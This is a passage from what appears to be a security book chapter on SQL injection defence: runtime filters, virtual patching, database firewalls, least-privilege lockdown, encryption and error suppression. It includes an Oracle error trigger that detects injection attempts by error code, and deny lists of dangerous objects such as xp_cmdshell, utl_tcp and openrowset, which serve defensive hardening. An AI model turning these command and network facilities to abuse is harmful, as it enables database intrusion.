(netscape), and internet information server (iis) all support this type of architecture. unfortunately, because each exposes its own api, you cannot leverage the modules across web server platforms. a clear advantage of web server modules is that they are not bound to a particular web application framework or programing language. for example, iis plug -ins, called isapi filters, can be used to validate and monitor requests bound for classic asp and asp.net web applications, as well as transform their response content. when the web server is configured to use a connector (a filter that routes requests to the appropriate resource handler) or in reverse proxy server mode, filters can be leveraged to protect virtually any web application (i.e. you can use iis isapi filters to protect j2ee, php, and coldfusion web applications). lastly, because filters are executed for every web page request, performance is critical. web server filters are typically implemented in a native programing language such as c or c++, which can be very fast, but has the potential to introduce new classes of vulnerabilities to consider, such as buffer overflows and format string issues. web server modules are an important component of runtime security because of the request and response handling apis they expose. this allows you to extend the behavior of the web server to meet your specific needs, such as writing a filter for sql injection protection. luckily, you can use several freely available web server filter implementations for sql injection protection. we already discusse d modsecurity, an apache api module which offers considerable sql injection protection. what follows is a brief description of urlscan and webknight, two freely available isapi filters that plug into the iis web server platform and provide sql injection pr otection. urlscan in june 2008, microsoft released version 3.1 of urlscan as an upgrade to the 2.5 version originally released as part of the iis lock down tool. like its predecessor, 3.1 is a free isapi filter that blocks certain malicious requests; howev er, this version is geared toward application -level attacks —specifically, sql injection, as it was released in response to the mass sql injection worms that began infecting web sites in early 2008. this new version supports creating custom rules for blocki ng certain malicious requests; however, its protection is limited to querystrings, headers, and cookies. you can apply the rules to any web resource hosted on the server, such as classic asp and asp.net resources. it also enhances the normal iis logging fa cilitates, supports a logging -only mode, and is configurable from the urlscan.ini file. unfortunately, regular expressions are not supported and post data is not protected. these two limitations make urlscan a less -than-optimal solution for sql injection p rotection. because it is easy to install, it could be useful for legacy applications where code modifications are not an option and a quick band- aid solution is needed. you can find more information on urlscan at http://learn.iis.net/page.aspx/938/urlscan- 3reference/ and you can download it at http://www.microsoft.com/downloads/details.aspx?familyid=ee41818f -3363- 4e24- 9940321603531989 for the 32 bit version, and http://www.microsoft.com/downloads/details.aspx?familyid=361e5598- c1bd- 46b8- b3e73980e8bdf0de for the 64 bit version. webknight like urlscan, webknight is implemented as an iis isapi filter that blocks certain malicious requests. it matches all of the features offered by urlscan, and by far its biggest benefit over urlscan is that it can check post data for malicious input. it is highly configurable and comes with a gui, which makes it easier to configure than urlscan. in fact, you can import your urlscan settings into webknight. unfortunately, like urlscan, webknight does not support regular expressions and so is limited to blacklist keyword validation. webknight is a better solution than urlscan when it comes to sql injection due to its more comprehensive coverage of the request. it is also easy to install, but its lack of support for regular expressions and a positive security model make it more of a quick band- aid solution or an initial defense mechanism against automated sql injection worms. you can download webknight at www.aqtronix.com . tools & traps... know your filter before using a filter to protect your web application from sql injection, it’s important that you understand how the filter works and the type of protection it provides. al though filters are valuable runtime security tools, they can introduce a false sense of security if you do not completely understand their behavior and security model. microsoft’s urlscan 3.1 is a good example of this, as it provides only querystring, header, and cookie protection. pages with post parameters vulnerable to sql injection will be left exposed to exploitation. application filters you also can implement filters in the web application’s programing language or framework. the architecture is simila r to that of web server plug -ins: modular code executes as requests and responses pass through a series of phases. you can use the asp.net system.web.ihttpmodule interface and the javax.servlet.filter interface to implement the filter pattern. you can then add them to an application without code changes and activate them declaratively in the application configuration file. figure 9.8 shows an example code snippet of the dofilter method of a custom j2ee filter class. th is method is called for each request/response pair for a j2ee web resource (jsp file, servlet, etc.). figure 9.8 code snippet of a custom j2ee filter class in terms of runtime protection, application filters are useful because they can be developed independently of the application, deployed as a stand- alone .dll or .jar file, and turned on immediately. this means this solution can be deployed more quickly in certain organizations because web server configuration changes are not required (in many organizations, application developers do not have access to the web servers and so must coordinate with the web server team to make the configuration changes associated with a web server filter). because these filters are implemented in the same programming language as the application, they can extend or closely wrap existing application behavior. for this same reason, their utility is limited to applications built on t he same framework (refer to the tools and traps sidebar, “protecting web applications with asp.net and iis,” for information on how you can overcome this limitation). similar to web server filters, application filters allow you to add security features, su ch as malicious request detection, prevention, and logging, to vulnerable web applications. because they can be written in feature -rich object -oriented languages such as java and c#, they are usually less complex to code and do not introduce new vulnerabil ity classes such as buffer overflows. the owasp esapi web application firewall (part of the owasp enterprise security api) and secure parameter filter (spf) are free application filters that you can use to detect and block sql injection attacks. owasp esap i waf is a j2ee filter and you can download it as part of esapi at www.owasp.org/index.php/category:owasp_enterprise_security_api . spf is an asp.net httpmodule and you ca n download it at http://spf.codeplex.com/ . tools & traps... protecting web applications with asp.net and iis web applications that are not built on the .net framework, but run on iis (php, classic asp, perl, etc.), ca n be processed by asp.net code modules by mapping their file type (.php, .asp, .pl, etc.) to an asp.net isapi dynamic link library (dll). you can configure this under the application’s configuration in iis with the application configuration | mappings tab. in this scenario, an asp.net httpmodule that performs input validation and logging can now be leveraged on non -asp.net web applications. however, there are limitations on what you can do to the request and response, especially in the area of response tran sformation. the iis 7.0 and up, asp.net integrated mode enhances this capability further by combining the asp.net request pipeline with the iis core request pipeline. essentially, you can plug asp.net httpmodules into iis and have control over the entire r equest and response that in previous versions of iis was possible only with an isapi filter. this gives httpmodules the capability to perform comprehensive processing of requests and responses, and permits a module such as spf to provide non -editable input protection to non- asp.net web applications through transformation of response content. for more information on the type of protection spf provides, refer to “non -editable versus editable input protection.” implementing the filter pattern in scripted languages for web scripting languages, the filter pattern can be more difficult to implement. technologies such as php and classic asp don’t provide built -in interfaces for hooking into request/response handling before or after page execution. you could use a w eb server filter or even an application filter (refer to the tools and traps sidebar, “protecting web applications with asp.net and iis” for more details) to protect a vulnerable classic asp application; however, this requires administrative privileges on the web server to make configuration changes, which may not always be the case or may not be convenient. additionally, you may not want to modify the code for reasons discussed at the start of “using runtime protection.” for php web applications, you can l everage the auto_prepend_file and auto_append_file configuration directives in the php.ini file. these directives point to php files that will be executed before and after the execution of every php script that is requested. the added -in logic would be use d to loop through the various http request collections (querystring, post , cookies, headers, etc.) and validate and/or log as necessary. an alternative for both php and classic asp applications is to use include files. this requires code modification in the form of adding include directives on every application page. similarly, the included logic would loop through the various http request collections and validate and/or log as necessary. filtering web service messages the intercepting filter pattern is als o easy to apply to xml web services with custom input and output filters. an input filter could perform validation of method parameters and log sql injection attempts. you also could use an output filter to suppress error details, such as those that often leak out in the faultstring of a soap fault message. the .net web services and apache axis platforms, for example, both provide mechanisms for filtering inbound and outbound messages. modsecurity can also handle inbound xml messages to perform validation a nd logging with the xml target . validation can be performed with xpath queries, or against a schema or document type definition (dtd) file. commercial xml firewalls can also be considered, although they are typically network appliances and likely overkill if you are just looking for sql injection protection. non-editable versus editable input protection almost every filter implementation employs blacklist protection, whereas whitelist validation, which is much more powerful and effective against sql injecti on, is less prevalent and often complex to configure. this is likely because defining an exact match (i.e. whitelist) for every request parameter is a daunting task, even if a learning mode is available. this is especially true for inputs that accept free -form text, such as textboxes. another input validation strategy to consider is classifying application inputs as editable and non-editable, and locking down the non -editable inputs so that they cannot be manipulated. non-editable inputs are those that end users do not need to modify directly —hidden form fields, uris and querystring parameters, cookies, etc. the theory behind the strategy is that the application should permit users to perform only those actions that the user interface has presented to them. the idea is to leverage http responses at runtime to identify all legitimate requests (forms and links), collect the state of each possible request, and then validate subsequent requests against the stored state information. for many applications, non- editable inputs are the majority of input accepted by an application. therefore, if you can lock these down automatically at runtime, you can then focus your efforts on comprehensively validating the editable inputs, which is usually a much more manageable tas k. examples of technologies that implement this strategy are http data integrity validator (hdiv) and spf. you can use hdiv to protect most j2ee web applications that follow the model -view -controller (mvc) pattern and you can download it at www.hdiv.org . you can use spf to protect asp.net web applications when run on iis 6.0; however, it can be leveraged to protect virtually any web application when run on iis 7.0 and above. refer to the tools and traps sidebar, “protecti ng web applications with asp.net and iis,” for more information. you can download spf at http://spf.codeplex.com . url/page -level strategies let’s look at some other techniques for virtual -patching a vulnerable url or page without changing the source code. page overriding if a page is vulnerable and needs replacing, you can create a replacement page or class that is substituted at runtime. the substitution is accomplished with configuration in the web application’s configuration file. in asp.net applications, you can use ht tp handlers to accomplish this task. figure 9.9 shows a custom http handler configured to handle requests to pagevulntosqli.aspx instead of the vulnerable page itself. the substituted handler class implements the logic of the original page in a secure manner. this could include stringent validation of request parameters and the use of secure data access objects. figure 9.9 configuring an http handler in web.config you can use a similar approach in the deployment descriptor of a j2ee web application. you can map the vulnerable url to a servlet that handles the request in a s ecure manner, as shown in figure 9.10. figure 9.10 configuring a substitute servlet in web.xml url rewriting a somewhat similar technique to page overriding is url rewriting. you can configure the web server or application framework to take requests that are made to a vulnerable page or url and redirect th em to an alternative version of the page. this new version of the page would implement the logic of the original page in a secure manner. the redirection should be performed server- side so that it remains seamless to the client. there are a number of ways to accomplish this depending on the web server and application platform. the apache module mod_rewrite and the .net framework urlmappings element are two examples. resource proxying/wrapping you can combine resource proxying/wrapping with either page overr iding or url rewriting to minimize the amount of custom coding needed in the replacement page. when the replacement page handles the rewritten request, it would iterate through the request parameters (querystring, post , cookies, etc.) and perform the requi red validations. if the request is deemed safe, the request would be permitted to pass on to the vulnerable page via an internal server request. the vulnerable page would then handle the input and perform whatever rendering is needed. passing input to the vulnerable page in this manner is acceptable because the replacement page has performed the necessary validation to ensure the input is safe. essentially, the replacement page wraps the vulnerable page, but does not require duplication of logic. aspect -oriented programing (aop) aspect -oriented programing is a technique for building common, reusable routines that can be applied application wide. during development this facilitates separation of core application logic and common, repeatable tasks (input validation, logging, error handling, etc.). at runtime, you can use aop to hot -patch applications that are vulnerable to sql injection, or embed intrusion detection and audit logging capabilities directly into an application without modifying the underlying sou rce code. the centralization of security logic is similar to the intercepting filter previously discussed, except the benefits of aop can extend well beyond the web tier. you can apply security aspects to data access classes, thick client applications, and middle -tier components, such as enterprise javabeans (ejbs). for example, you could implement checks for insecure dynamic sql libraries (e.g. executequery() ), prevent the query from executing, and log the offending call for follow -up remediation efforts. there are a number of aop implementations, but some of the more common ones are aspectj, spring aop, and aspect.net. application intrusion detection systems (idss) you could use traditional network- based idss to detect sql injection attacks; however idss are often not optimal for this purpose as they are far removed from the application and web server. however, if you already have one of these running on your network you could still leverage it for an initial line of defense. as mentioned previously, a waf can serve as a very good ids because it operates at the application layer and can be finely tuned for the specific application being protected. most wafs come with a passive mode with alerting capabilities. in many production application environments, using a security filter or waf in this capacity is preferred. you can use them to detect attacks and alert administrators who can then decide what should be done about the vulnerability —for example, perhaps enabling blocking of malicious requests for the speci fic page/parameter combination or applying a virtual patch. another option is an embedded solution such as phpids ( http://phpids.org/ ). phpids does not filter or sanitize input, but rather detects attacks and takes action based on its configuration. this could range from simple logging to sending out an emergency e -mail to the development team, displaying a warning message for the attacker or even ending the user’s session. database firewall the last runtime protection tec hnique we’ll cover is the database firewall, which is essentially a database proxy server that sits between the application and the database. the application connects to the database firewall and sends the query as though it were normally connecting to the database. the database firewall analyzes the intended query and passes it on to the database server for execution if deemed safe. alternatively, it can prevent the query from being run if malicious. it can also serve as an application -level ids for malici ous database activity by monitoring connections in passive mode and altering administrators of suspicious behavior. in terms of sql injection, database firewalls could potentially be just as effective if not more so than wafs. consider that the queries the web application sends to the database are, for the most part, a known quantity of commands, and their structure is known as well. you can leverage this information to configure a highly tuned set of rules that takes appropriate action (log, block, etc.) a gainst unusual or malicious queries before they ever hit the database. one of the hardest problems with locking down input in a waf is that malicious users can send in any combination of requests to the web server. an example open source implementation is greensql, which you can download at www.greensql.net . securing the database when an attacker has an exploitable sql injection vulnerability, he can take one of two primary exploit paths. he can go after the application data itself, which depending on the application and the data could be very lucrative. this is especially true if the application handles and insecurely stores personally identifiable information or financial data, such as bank account and credit card information. alternatively, the attacker may be interested in leveraging the database server to penetrate internal, trusted networks. in this section, we’re going to look at ways to limit unauthorized access to application data. then we’ll look at some techn iques for hardening the database server to help prevent privilege escalation and limiting access to server resources outside the context of the target database server. you should fully test the steps we’ll be covering in a non- production environment first, to avoid breaking the functionality of existing applications. new applications have the benefit of building these recommendations into the development life cycle early to avoid dependencies on unnecessary and privileged functionality. locking down the application data let’s first examine some techniques restricting the scope of an sql injection attack to the application database only. we’re also going to look at ways to restrict access even if the attacker has been successfully sandboxed to the application database. use the least -privileged database login applications should connect to the database server in the context of a login that has permissions for performing required application tasks only. this critical defense can significantly mitigate the risk of sql injection, by restricting what an attacker can access and execute when exploiting the vulnerable application. for example, a web application used for reporting purposes, such as checking the performance of your investment portfoli o, should ideally access the database with a login that has inherited only the permissions on objects (stored procedures, tables, etc.) needed to produce this data. this could be execute permissions on several stored procedures and possibly select permissi ons on a handful of table columns. in the event of sql injection, this would at least limit the possible set of commands to the stored procedures and tables within the application database and prevent malicious sql outside this context, such as dropping ta bles or executing operating system commands. it’s important to remember that even with this mitigating control the attacker may still be able to circumvent business rules and view the portfolio data of another user. to determine the permissions assigned to a database login, find its role membership and remove any unnecessary or privileged roles, such as the public or database administrator role. ideally, the login should be a member of one (or possibly more) custom application role. a follow -up step is to a udit permissions assigned to custom application roles to ensure that they are locked down appropriately. during a database audit, it is very common to find unnecessary update or insert permissions assigned to custom application roles intended for read- only access. these audit and subsequent cleanup steps can be performed with graphical management tools that often accompany the database server platform or with sql via the query console. segregated database logins an extension of the least -privileged database login is to use multiple database logins for applications that require write as well as read access to the database. in applications that have relatively little write or update functionality compared to the amount of read -only or reporting functionality w e can gain additional security by segregating read -only select functionality within the application from functionality requiring wider write access such as insert or update. we can then map each segregated part of the application to an underlying database login with only the required access to the database, therefore minimizing the impact of any sql injection issue in the read -only part of the application. revoke public permissions every database server platform has a default role to which every login belon gs, usually called the public role, which has a default set of permissions that includes access to system objects. attackers can use this default access to query database metadata to map out the database schema and target the juiciest tables for subsequent querying, such as those storing application login credentials. the public role is also commonly assigned permissions to execute built -in system stored procedures, packages, and functions used for administrative purposes. usually you cannot drop the public role; however, it is recommended that you not grant additional permissions to the public role, because each database user inherits the permissions of this role. you should revoke public role permissions from as many system objects as possible. additionall y, you must revoke superfluous permissions granted to the public role on custom database objects (such as application tables and stored procedures) unless a justifiable reason for the permissions exists. if necessary, you should assign database permissions to a custom role that you can use to grant a default level of access to specific users and groups. use stored procedures from a security perspective, you should encapsulate application sql queries within stored procedures and grant only execute permissions on those objects. all other permissions, such as select, insert, and so on, on the underlying objects can then be revoked. in the event of sql injection, a least -privileged database login that has only execute permissions on application stored procedures makes it more difficult to return arbitrary result sets to the browser. this does not guarantee safety from sql injection however, as the insecure code could lie within the stored procedure itself. additionally, it may be possible to obtain result sets vi a other means, such as with blind sql injection techniques. use strong cryptography to protect stored sensitive data a key mitigating control against unauthorized viewing of sensitive data in the database is the use of strong cryptography. options include storing a mathematical hash of the data (rather than the data itself) or storing the data encrypted with a symmetric algorithm. in both cases, you should use only public algorithms deemed cryptographically strong. you should avoid homegrown cryptographic s olutions at all costs. if the data itself does not require storage, consider an appropriately derived mathematical hash instead. an example of this is data used for challenging the identity of a user, such as passwords or security question answers. if an a ttacker is able to view the table storing this data, only password hashes will be returned. the attacker must go through the time -consuming exercise of cracking password hashes to obtain the actual credentials. another clear benefit to hashing is that it e liminates the key management issues associated with encryption. to stay consistent with security best practices, ensure that the hashing algorithm of choice has not been determined mathematically susceptible to collisions, such as md5 and sha -1. consult resources such as nist ( http://csrc.nist.gov/groups/st/hash/policy.html ) to find out the current set of hashing algorithms deemed acceptable for use by federal agencies. if you must store sensit ive data, protect it with a strong symmetric encryption algorithm such as advanced encryption standard (aes) or triple des (data encryption standard). the primary challenge to encrypting sensitive data is storing the key in a location that the attacker cannot access easily. you should never store encryption keys client -side, and the best server side solution for key storage usually depends on the application architecture. if the key can be provided at runtime, this is ideal as it will only reside in memory on the server (and depending on the application framework it can be possible to protect it while in memory). however, on the-fly key generation is usually not feasible or practical in most enterprise application environments. one possible solution is to st ore the key in a protected location on the application server so that the attacker needs to compromise both the database server and the application server to decrypt it. in a windows environment, you can use the data protection api (dpapi) to encrypt appli cation data and leverage the operating system to securely store the key. another windows -specific option is storing the key in the windows registry, which is a more complex storage format than a flat text file and therefore could be more challenging to vie w depending on the level of unauthorized access gained by the attacker. when operating system specific storage options are not available (such as with a linux server), you should store the key (or secret used to derive it) on a protected area of the file s ystem with strict file system acls applied. it’s also worth noting that as of microsoft sql server 2005 and oracle database 10g release 2, both support column- level encryption natively. however, these nice built-in features do not provide much additional protection against sql injection, as this information will usually be transparently decrypted for the application. maintaining an audit trail maintaining an audit trail of access on application database objects is critical; however, many applications don’t do this at the database level. without an audit trail, it is difficult to know whether the integrity of application data has been maintained given an sql injection attack. the server transaction log might provide some detail; however, this log contains sys tem-wide database transactions, making it hard to track down application- specific transactions. all stored procedures could be updated to incorporate auditing logic; however, a better solution is database triggers. you can use triggers to monitor actions performed on application tables, and you don’t have to modify existing stored procedures to begin taking advantage of this functionality. essentially, you can easily add this type of functionality to existing applications without having to modify any data a ccess code. when using triggers, it’s important to keep the logic simple to avoid possible performance penalties associated with the additional code, and to ensure that the trigger logic is written securely to avoid sql injection within these objects. let’s take a closer look at oracle database triggers to better understand how triggers can be leveraged to detect possible sql injection attacks. oracle error triggers oracle database triggers can fire database- wide in the case of special events, such as the creation of a data definition language (ddl; e.g. ddl trigger), or in the case of a database error (e.g. error trigger). this can offer a simple and easy way to detect simple sql injection attempts. in many cases on oracle, sql injection attempts, at least in the beginning of an attack, will create error messages such as “ora -01756 single quote not properly terminated” or “ora 01789 query block has incorrect number of result columns.” the number of these error messages is small under normal circumstances, an d in most cases they are unique to sql injection attacks, therefore keeping the number of false positives low. the following code will find and document sql injection attempts in an oracle database: -- purpose: oracle database error trigger to detect sql injection attacks -- version: v 0.9 -- works against: oracle 9i, 10g and 11g -- author: alexander kornbrust of red- database- security gmbh -- must run as user sys -- latest version: http://www.red- database- security.com/scripts/oracle_error_trigger.html -- -- create a table containing the error messages create table system.oraerror ( id number, log_date date, log_usr varchar2(30), terminal varchar2(50), err_nr number(10), err_msg varchar2(4000), stmt clob ); -- create a sequence with unique numbers create sequence system.oraerror_seq start with 1 increment by 1 minvalue 1 nomaxvalue nocache nocycle; create or replace trigger after_error after servererror on database declare pragma autonomous_transaction; id number; sql_text ora_name_list_t; v_stmt clob; n number; begin select oraerror_seq.nextval into id from dual; -- n:= ora_sql_txt(sql_text); -- if n >= 1 then for i in 1..n loop v_stmt:= v_stmt || sql_text(i); end loop; end if; -- for n in 1..ora_server_error_depth loop -- -- log only potential sql injection attempts -- alternatively it’s possible to log everything if ora_server_error(n) in (‘900’,‘906’,‘907’,‘911’,‘917’,‘920’,‘923’,‘933’,‘970’,‘1031’,‘1476’,‘1719’,‘1722’,‘1742’, ‘1756’,‘1789’,‘1790’,‘24247’,‘29257’,‘29540’) and ((ora_server_error(n) = ‘1476’) and (instr(v_stmt,‘/∗ oracleoem’ ) =0)) -- exception bug in oracle oem then -- insert the attempt including the sql statement into a table insert into system.oraerror values (id, sysdate, ora_login_user, ora_client_i p_address, ora_server_error(n), ora_server_error_msg(n), v_stmt); -- send the information via email to the dba -- <<insert your plsql code for sending emails >> commit; end if; end loop; -- end after_error; / locking down the database server once the application data has been secured, you may still need to take a few additional steps to harden the database server itself. by default postgresql and mysql have relatively little additional functionality available to the user, however sql server and oracle both have rich functionality provided that should be disabled when hardening the database server. in a nutshell, you want to make sure the system -wide configuration is secured in a manner that is consistent with the security principle of least privilege and that the database server software is up to date and patched. if you comply with these two key directives, it will be very difficult for an attacker to access anything outside the scope of the intended application data. let’s take a closer look a t some specific recommendations. additional lockdown of system objects besides revoking public role permissions on system objects, consider taking additional steps to further lock down access to privileged objects, such as those used for system administrat ion, executing operating system commands, and making network connections. although these features are useful to database administrators, they are also just as useful (if not more so) to an attacker who has gained direct access to the database. consider res tricting by ensuring that superfluous permissions are not granted to application roles, disabling access to privileged objects system -wide via server configuration, or dropping functionality from the server completely (to avoid this being reenabled should privilege escalation occur). on oracle, you should restrict the ability to run operating system commands and to access files on the operating system level from the database. to ensure that (pl/)sql injection problems cannot be used to run operating system commands or access files, do not grant the following privileges to the web application user: create any library, create any directory, alter system, or create job. also, you should remove the public grant at least from the following packages if it is not n eeded: utl_file, utl_tcp, utl_mail, utl_smtp, httpuritype, utl_inaddr, dbms_advisor, dbms_sql, dbms_pipe, dbms_xmlquery and dbms_xmlgen. if the functionality of these packages is required it should be used only via secure application roles. in sql server, you should consider dropping dangerous stored procedures such as xp_cmdshell , as well as the procedures that match xp_reg ∗, xp_instancereg ∗, and sp_oa ∗. if this is not feasible, audit these objects and revoke any permissions that were unnecessarily assigne d. restrict ad hoc querying microsoft sql server supports a command called openrowset to query remote and local data sources. remote querying is useful in that it can be leveraged to attack other database servers on connected networks. querying the local s erver with this function allows an attacker to reauthenticate to the server in the context of a more privileged sql server database login. you can disable this feature in the windows registry by setting disallowadhocaccess to 1 for each data provider at hk lm\\software \\microsoft \\mssqlserver \\providers. similarly, oracle supports ad hoc querying of remote servers via database links. by default, a normal user does not require this privilege and you should remove it from the account. check the create database lin k privilege (part of the connect role until oracle 10.1) to ensure that only required logins and roles are assigned to avoid attackers creating new links. strengthen controls surrounding authentication you should review all database logins, and disable or delete those that are unnecessary, such as default accounts. additionally, you should enable password strength within the database server to prevent administrators from selecting weak passwords. attackers can leverage weakly protected accounts to reauthent icate to the database server and potentially elevate privilege. lastly, enable server auditing to monitor suspicious activity, especially failed logins. in sql server databases, consider exclusive use of integrated windows authentication instead of the les s secure sql server authentication. when you do this, attackers will be unable to reauthenticate using something such as openrowset ; in addition, it reduces the possibility of sniffing passwords over the network, and can leverage the windows operating system to enforce strong password and account controls. run in the context of a least -privileged operating system account if an attacker is able to break outside the context of the database server and gain access to the underlying operating system, it is critical that this occurs in the context of the least -privileged operating system account. you should configure database server software running on ∗ nix systems to run in the context of an account that is a member of a custom group that has minimal file system permissions to run the software. by default, sql server 2005 and later installers will select the minimally privileged network service account for running sql server. tools & traps... sql server is taking security seriously the good news is that starting wit h sql server 2005, microsoft included a handy configuration utility called sql server service area configuration, which makes it really easy to disable most of the functionality that an attacker could abuse. previous versions of sql server required running transact -sql statements or modifying the windows registry. even better, most of the dangerous features are disabled by default. ensure that the database server software is patched keeping software up to date with the current patch level is a fundamental security principle, but it’s easy to overlook given that database servers are not usually internet -facing systems. an attacker can often exploit server vulnerabilities via an application -level sql injection vulnerability just as easily as though he were on the same network as the database server. the exploit payload could be a sequence of sql commands that exploit a sql injection vulnerability in a pl/sql package, or even shell code t o exploit a buffer overflow in an extended stored procedure. automated update mechanisms are ideal for keeping up to date. you can keep sql server up to date with microsoft update ( http://update.microsoft.com ). oracle database administrators can check for current updates by signing up with the oracle metalink service ( https://metalink.oracle.com/csp/ui/index.html). mysql and postgresql will often be pac kaged by the operating system vendor (for example, red hat), and can therefore be patched via the same method used for updating the operating system —if installed or compiled manually, updates will need to be installed manually, and therefore it is not recommended to custom install unless this is required. third- party patch management systems are another way to keep patch levels current. table 9.1 shows commands that can help you determine the version of the database server software for sql server and oracle. also included in the table are links for checking the version information to tell whether your database server is completely patched for these platforms. table 9.1 determining sql server/oracle database server versions additional deployment conside rations this section covers additional security measures to help you secure deployed applications. these are primarily configuration enhancements to the web server and network infrastructure to help slow the identification of applications that are potentia lly vulnerable to sql injection. these techniques can be useful as a first layer to prevent detection by automated sql injection worms that are becoming increasingly prevalent and dangerous. additionally, we’ll look at techniques to slow and/or mitigate ex ploitation once sql injection has been identified. minimize unnecessary information leakage in general, leaking unnecessary information about software behavior significantly aids an attacker in finding weaknesses within your application. examples include s oftware version information that can be used to footprint a potentially vulnerable version of an application, and error details related to an application failure, such as a sql syntax error that occurs on the database server. we’re going to look at ways to suppress this information declaratively within application deployment descriptor files and hardening the web server configuration. suppress error messages error messages that include information detailing why a database call failed are extremely useful in the identification and subsequent exploitation of sql injection. handling exceptions and suppression of error messages is most effective when done with application- level error handlers. however, inevitably there is always the possibility of an unanticipat ed condition at runtime. therefore, it is a good practice to also configure the application framework and/or web server to return a custom response when unexpected application errors result, such as an http response with a 500 status code (i.e. internal se rver error). the configured response could be a custom error page that displays a generic message or a redirection to the default web page. the important point is that the page should not reveal any of the technical details related to why the exception occurred. table 9.2 provides examples for configuring applications and web servers to return a custom response when an error condition occurs. table 9.2 configuration techniques for displaying custom errors platform configuration instruction s asp.net web application in the web.config file, set customerrors to on or remoteonly and defaultredirect to the page for display. ensure that the page configured for defaultredirect actually exists at the configured location, as this is a common mistake! <customerrors mode=“on” defaultredirect=“/custompage.aspx”> </customerrors> this will be effective for asp.net resources only. additionally, the platform configuration instruction s configured page will be displayed for any error that occurs (500, 404, etc.) that is not handled by application code. j2ee web application in the web.xml file, configure the <error- page> element with an <errorcode> and <location> element. <error-page> <error-code>500</error- code> <location>/custompage.html</location> </error- page> this will be effective for resources that are specifically handled by the java application server only. additionally, the configured page will be displayed for 500 errors only. classic asp/vbscript web application iis must be configured to suppress detailed asp error messages. you can use the following procedure to configure this setting: 1 in the iis manager snap -in, right -click the web site and select properties . 2 on the home directory tab, click the configuration button. ensure that the send text error message to client option is checked, and that an appropriate message exists in the textbox below this option. php web application in the php.ini file, set display_errors = off. additionally, configure a default error document in the web server configuration. refer to the instructions for apache and iis in the following two table entries. apache web server add the errordocument directive to apache (inside the configuration file, usually httpd.conf) that points to the custom page. errordocument 500 /custompage.html iis to configure custom errors in iis you can use the following procedure: platform configuration instruction s 1 in the iis manager snap -in, right -click the web site and select properties . 2 on the custom errors tab, click the configuration button. highlight the http error to be customized and click the edit button. you can then select a file or url from the message type drop down to be used in place of the default. one approach that can help make error detection difficult based on responses is to configure the application and web server to return the same response, such as a redirect to the default home page irrespective of error code (401, 403, 500, etc.). obviously, you should use caution when employing this strategy, as it can make legitimate debugging of application behavior difficult. if the application has been designed with good error handling and logging that can provide application administrators with enough detail to reconstruct the problem, this might be a worthwhile strategy to consider. use an empty default web site the http/1.1 protocol requires http clients to send the host header in the request to the web server. to access a specific web site, the header value must match the host name in the web server’s virtual host configuration. if a match is not found, the default web site content will be returned. for example, attempting to connect to a web site by internet protocol (ip) address will result in the content of the default web site being returned. consider the following example: get / http/1.1 host: 209.85.229.104 ... <html><head><meta http- equiv=“content- type” content=“text/html; charset=iso- 88591”><title>google</title> here a request has been made to 209.85.229.104, which is actually an ip address of a google web server. what is returned by default is the familiar google search page. this configuration makes sense for google because google likely doesn’t care whether it is being accessed by ip address or host name; google wants everyone on the internet to use its service. as the owner of an enterprise web application, you may prefer a little more anonymity and would like to avoid discovery by attackers scanning your ip address range for ports 80 and 443. to ensure that users are connecting to your web application by host name only, which usually takes the attacker more time and effort to dig up (but is known to your users), configure the web server’s default web site to return a blank default web page. given that legitimate users usually prefer easy -to-remember host names, access attempts via ip address could be a good way to detect potential intrusion attempts. lastly, it’s worth pointing out that this is a defense- in-depth mechanism and is not sufficient to prevent unwanted discovery, but it can be especially effective against automated scanning programs (such as vulnerability scanners or even sql injection worms) looking to identify vulnerable web sites by ip address. use dummy host names for reverse dns lookups as mentioned previously that it takes a little more work to discover valid host names before a web site can be accessed if all you have is an ip address. one way to do this is to perform a reverse domain name system (dns) lookup on the ip address. if the i p address resolves to a host name that is also valid on the web server, you now have the information you need to connect to that web site. however, if the reverse lookup returns something a little more generic, such as ool -43548c24.companyabc.com , you can keep unwanted attackers from discovering your web site via reverse dns lookups. if you’re using the dummy host name technique, ensure that the default web site is also configured to return a blank default web page. again, this is a defense -in-depth mechani sm and is not sufficient to prevent unwanted discovery, but it can be effective against automated scanning programs (such as vulnerability scanners or even sql injection worms). use wildcard ssl certificates another way to discover valid host names is to e xtract them from secure sockets layer (ssl) certificates. one way to prevent this is the use of wildcard ssl certificates. these certificates allow you to secure multiple subdomains on one server using the ∗ .domain.com pattern. these are more expensive than standard ssl certificates, but only a couple of hundred dollars more. you can find more information about wildcard certificates and how they differ from standard ssl certificates at http://help.godaddy.com/article/567 . limit discovery via search engine hacking search engines are another tool that attackers can use to find sql injection vulnerabilities in your web site. there is a lot of publicly available information on the internet, and even books dedic ated to the art of search engine hacking. the bottom line is that if you are tasked with defending a public -facing web application, you must consider search engines as another way for attackers or malicious automated programs to discover your site. most of the major search engines (google, yahoo!, bing, etc.) provide steps and online tools for removing your web site content from their indexes and caches. one technique that is common across all the major search engines is the use of a robots.txt file in the root directory of your web site, which is intended to prevent crawlers from indexing the site. figure 9.11 shows an example robots.txt configuration, which prevents all robots from crawling all pages on the web site. figure 9.11 directives needed in a robots.txt file to help prevent search engine crawling google notes, how ever, that this may not be sufficient to prevent indexing by its crawler if your site is linked to from another site. google recommends that you also use the noindex meta tag, as shown in figure 9.12. figure 9.12 html noinde x meta tag to help prevent search engine indexing here are a few links from the popular search engines to help protect your web pages from unwanted discovery: • www.g oogle.com/support/webmasters/bin/answer.py?hl=en&answer=35301 • http://onlinehelp.microsoft.com/en -us/bing/hh204505.aspx disable web services description language (wsdl) information web services are often just as vulnerable to sql injection as web applications. to find vulnerabilities in web services, attackers need to know how to communicate with the web service, namely the supported communication protocols (e.g. soap, http get, etc.) , method names, and expected parameters. all of this information can be extracted from the web services description language (wsdl) file of the web service. usually can be invoked by appending a ?wsdl to the end of the web service url. whenever possible, i t is a good idea to suppress this information from unwanted intruders. figure 9.13 shows how to configure a .net web service so that it does not display the wsdl. you can apply this configuration change to the applica tion web.config or machine.config file. figure 9.13 configuration to disable the display of .net web service wsdl information apache axis, a commonly used simple object access protocol (soap) web service platform for java applications, supports custom configuration of the wsdl file, which can be used to suppress auto -generation. you can configure the wsdlfile setting in the service’s .wsdd file to point to a file that returns an empty <wsdl/> tag. in general, leaving wsdl information remotely accessible on internet -facing web servers is strongly discouraged. you can use an alternative secured communication channel, such as encrypted e- mail, to provide this file to trusted partners who may need this information to communicate with the web service. increase the verbosity of web server logs web server log files can provide some insight into potential sql injection attacks, especially when application logging mechanisms are below par. if the vulnerability is in a url parameter, apache and iis will log this information by default. if you’re defending a web applicat ion that has poor logging facilities, consider also configuring your web server to log the referer and cookie headers. this will increase the size of the log 